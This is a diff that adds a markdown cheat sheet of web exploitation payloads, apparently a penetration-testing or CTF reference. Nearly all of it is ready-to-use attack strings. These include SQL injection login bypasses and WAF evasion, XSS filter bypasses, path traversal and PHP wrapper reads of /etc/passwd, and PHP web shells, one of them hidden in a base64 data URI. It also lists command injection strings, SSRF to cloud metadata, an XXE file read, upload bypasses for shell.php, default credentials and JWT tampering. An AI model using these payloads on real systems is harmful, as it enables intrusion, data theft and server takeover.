@@ -1,0 +1,216 @@
+# Web Exploitation Techniques
+
+## SQL Injection Bypasses
+
+### Authentication Bypass
+```sql
+' OR 1=1--
+' OR '1'='1'--
+admin'--
+' OR 'x'='x
+```
+
+### UNION-based SQLi
+```sql
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password,3 FROM users--
+' UNION SELECT 1,2,version()--
+```
+
+### WAF Bypass Techniques
+- Use comments: `/*!UNION*/` `/*!SELECT*/`
+- URL encoding: `%55NION` `%53ELECT`
+- Case manipulation: `UnIoN SeLeCt`
+- Double encoding
+- Hex encoding: `0x` prefix
+
+### Time-based Blind SQLi
+```sql
+' AND SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+' OR IF(1=1,SLEEP(5),0)--
+```
+
+## Cross-Site Scripting (XSS)
+
+### Basic Payloads
+```html
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+```
+
+### Filter Bypass
+```html
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="alert('XSS')">
+'-alert(1)-'
+"><script>alert(1)</script>
+```
+
+## Local File Inclusion (LFI)
+
+### Basic LFI
+```
+../../../etc/passwd
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+```
+
+### Null Byte Bypass (PHP < 5.3)
+```
+../../../etc/passwd%00
+```
+
+### Path Traversal Bypass
+```
+....//....//....//etc/passwd
+..\/..\/..\/etc/passwd
+```
+
+### PHP Wrappers
+```
+php://filter/convert.base64-encode/resource=index.php
+php://input (with POST data)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+```
+
+## Remote Code Execution (RCE)
+
+### Command Injection
+```bash
+; ls
+| whoami
+& cat /etc/passwd
+`id`
+$(whoami)
+```
+
+### PHP Code Injection
+```php
+<?php system($_GET['cmd']); ?>
+<?php eval($_POST['code']); ?>
+<?=`$_GET[0]`?>
+```
+
+## Directory Traversal
+
+### Common Paths to Check
+```
+/admin
+/administrator
+/backup
+/backups
+/.git
+/.env
+/config.php
+/phpinfo.php
+/test.php
+/debug
+/api
+/api/v1
+/swagger
+/.well-known
+/robots.txt
+/sitemap.xml
+```
+
+## Server-Side Request Forgery (SSRF)
+
+### Basic SSRF
+```
+http://localhost
+http://127.0.0.1
+http://0.0.0.0
+http://[::1]
+```
+
+### Cloud Metadata
+```
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+## XXE (XML External Entity)
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+```
+
+## File Upload Bypass
+
+### Extension Manipulation
+```
+shell.php.jpg
+shell.php%00.jpg
+shell.php;.jpg
+shell.php%20.jpg
+```
+
+### Double Extensions
+```
+shell.jpg.php
+shell.php.jpg
+```
+
+### Content-Type Manipulation
+Change Content-Type to: image/jpeg, image/png
+
+## Authentication Bypass
+
+### Default Credentials
+```
+admin:admin
+admin:password
+root:root
+administrator:administrator
+```
+
+### JWT Manipulation
+- Change algorithm to "none"
+- Brute force secret key
+- Check for key confusion (RS256 vs HS256)
+
+## API Testing
+
+### Common Endpoints
+```
+/api/v1/users
+/api/v1/admin
+/api/docs
+/api/swagger
+/graphql
+/api/debug
+```
+
+### HTTP Methods
+- Try PUT, DELETE, PATCH on GET/POST endpoints
+- OPTIONS to discover allowed methods
+- HEAD to bypass restrictions
+
+## Session Management
+
+### Cookie Manipulation
+- Remove HttpOnly flag attempts
+- Session fixation
+- Cookie poisoning
+- JWT token manipulation
+
+## Important Headers
+
+### Information Disclosure
+```
+X-Powered-By: PHP/7.4.3
+Server: Apache/2.4.41
+X-AspNet-Version
+```
+
+### Security Headers (check if missing)
+```
+X-Frame-Options
+Content-Security-Policy
+X-XSS-Protection
+Strict-Transport-Security
+```
